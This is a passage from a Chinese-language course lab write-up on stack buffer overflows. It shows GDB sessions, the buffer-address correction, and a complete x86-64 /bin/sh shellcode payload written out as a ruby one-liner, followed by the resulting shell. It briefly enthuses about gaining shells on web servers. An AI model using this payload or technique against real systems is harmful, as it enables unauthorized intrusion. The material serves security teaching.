   │0x7fffffffe3db  add    %al,(%rdx)                                        │
   │0x7fffffffe3dd  add    %al,(%rax)                                        │
   │0x7fffffffe3df  add    %al,(%rax)                                        │
   │0x7fffffffe3e1  add    %al,(%rax)                                        │
   │0x7fffffffe3e3  add    %al,(%rax)                                        │
   │0x7fffffffe3e5  add    %al,(%rax)                                        │
   │0x7fffffffe3e7  add    %al,0x40(%rbx,%rdx,1)                             │
   │0x7fffffffe3eb  add    %al,(%rax)                                        │
   └─────────────────────────────────────────────────────────────────────────┘
child process 21114 In:                         Line: ??   PC: 0x7fffffffe3d2
(gdb) c
Continuing.

Program received signal SIGILL, Illegal instruction.
0x00007fffffffe3d2 in ?? ()
(gdb)
```
　　Illegal instruction？为啥会这样呢？我们不是已经做好一切工作了嘛！有了恶意代码，也知道了恶意代码的起始地址，甚至还成功将函数的返回地址修改成了恶意代码的起始地址，按理来说，程序返回后就应该去执行我们的恶意代码呀。
　　然而，这是幻觉。我们可以看一下`0x7fffffffe3d0`附近的指令，是不是很奇怪，这根本不是我们设计的恶意代码呀！这时错误原因很明显了，`0x7fffffffe3d0`原来不是恶意代码的起始位置！
　　这似乎有些矛盾。我们前面提到GDB有关闭`stack randomization`，那么程序的初始栈顶地址应该是不变的，从而buffer的地址也不应该变。但事实并不是这样，因为我们忽视了一个条件：**不受其他外界因素的影响**。这里出现的外界因素是什么呢？其实就是我们输入的数据自身，要知道我们把这些数据作为参数传给`main`函数时，它们是要被压入堆栈的，这会使得栈顶地址变得更小，从而buffer对应的地址也会更小，不再是原来的`0x7fffffffe3d0`了。我们需要重新获取正确的buffer地址，这次我们还是将`evil.bin`作为参数：
``` bash
# 获取正确的buffer地址
   ┌─────────────────────────────────────────────────────────────────────────┐
B+ │0x401170 <foo+12>       mov    -0x48(%rbp),%rdx                          │
   │0x401174 <foo+16>       lea    -0x40(%rbp),%rax                          │
  >│0x401178 <foo+20>       mov    %rdx,%rsi # 程序暂时停在这里              │
   │0x40117b <foo+23>       mov    %rax,%rdi                                 │
   │0x40117e <foo+26>       callq  0x400320                                  │
   │0x401183 <foo+31>       leaveq                                           │
   │0x401184 <foo+32>       retq                                             │
   │0x401185 <main>         push   %rbp                                      │
   │0x401186 <main+1>       mov    %rsp,%rbp                                 │
   └─────────────────────────────────────────────────────────────────────────┘
child process 21854 In: foo                           Line: 6    PC: 0x401178
(gdb) p/x $rax
$1 = 0x7fffffffe380
(gdb)
```
　　原来`0x7fffffffe380`才是真正的buffer地址，话不多说，赶紧修改`evil.bin`中的数据，将`\xd0\xe3\xff\xff\xff\x7f`换为`\x80\xe3\xff\xff\xff\x7f`，然后重新使用GDB观察攻击是否生效：
``` bash
# 重新测试
3130104006@hamsa:~/project3$ ruby -e 'print "\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh"+"\x90"*22+"\x80\xe3\xff\xff\xff\x7f"' > evil.bin
3130104006@hamsa:~/project3$
3130104006@hamsa:~/project3$ gdb victim -q
Reading symbols from /home/3130104006/project3/victim...done.
(gdb) r `cat evil.bin`
Starting program: /home/3130104006/project3/victim `cat evil.bin`
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffd000
process 22411 is executing new program: /bin/dash
$
$ echo $0
/bin/sh
$
$ uptime
 10:33:04 up 5 days,  4:58, 13 users,  load average: 0.00, 0.01, 0.05
$
$ exit
[Inferior 1 (process 22411) exited normally]
(gdb) q
3130104006@hamsa:~/project3$
```
　　哇！这次是真正的成功了。我们看到，在利用`evil.bin`内的数据作为程序参数时，程序会自动执行`/bin/sh`，我们也能在这个shell中执行一些常用的Linux命令。这就是一次非常简单的`buffer overflow`攻击呀！
　　可能有些同学看到这里，会觉得这个攻击好low啊，就跑了一个shell，又不是拿到了什么管理员密码啥的，并没有什么作用嘛。其实不然，跑出一个shell是一件很有意义的事！试想一下，假设某个网站有一个输入框，要求用户输入自己的账号，而聪明的你发现经过某些特别的手段(不一定是`buffer overflow`)，能够使网站后台程序接收到你的输入后跑出shell，此时你一定乐坏了。因为你能够通过输入命令查看到服务器的很多重要信息！注意，此时你的身份不一定是root，这取决于执行网站程序的用户身份，如果刚好是root在跑这个网站程序，那么恭喜你，你拥有了root的权限，这台服务器已经属于你了；如果不是，那也不要紧，起码这个服务器的一部分已经属于你。

## Exploit Buffer Overflow without GDB
　　下面介绍一下，不用GDB怎么实现`buffer overflow`。
// TODO

``` bash
~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:26
$ echo $0
zsh

~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:28
$ gcc victim.c -g -Wall -fno-stack-protector -z execstack -static -o victim

~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:30
$ ./victim `cat input.bin`
$
$ echo $0
/bin/sh
$
$ ls -l
total 2588
-rw-r--r-- 1 hac hac     79 May  9 20:32 input.bin
-rw-r--r-- 1 hac hac     49 May  8 10:48 shellcode.bin
-rwxr-xr-x 1 hac hac 874196 May  9 20:17 sp
-rw-r--r-- 1 hac hac    428 May  9 20:16 sp.c
-rwxr-xr-x 1 hac hac 874200 May  9 20:35 test
-rw-r--r-- 1 hac hac    169 May  9 20:35 test.c
-rwxr-xr-x 1 hac hac 874202 May  9 20:39 victim
-rw-r--r-- 1 hac hac    169 May  9 20:37 victim.c
$
$ exit

~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:49
$
```


## Reference

1. [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html)(非常详细的说明，也是MIT 6-858推荐的阅读材料)
2. [Lecture Homepage](http://10.214.148.181/)(仅学校内网可以访问)


  [1]: http://static.zybuluo.com/hac/ievx030z55g087jjjzdek5dy/Selection_093.png
  [2]: http://static.zybuluo.com/hac/o2ovzv62jrr95vlzrdxzug1x/Selection_094.png
  [3]: http://static.zybuluo.com/hac/73mrfpgsumtjebroggovldju/Selection_095.png

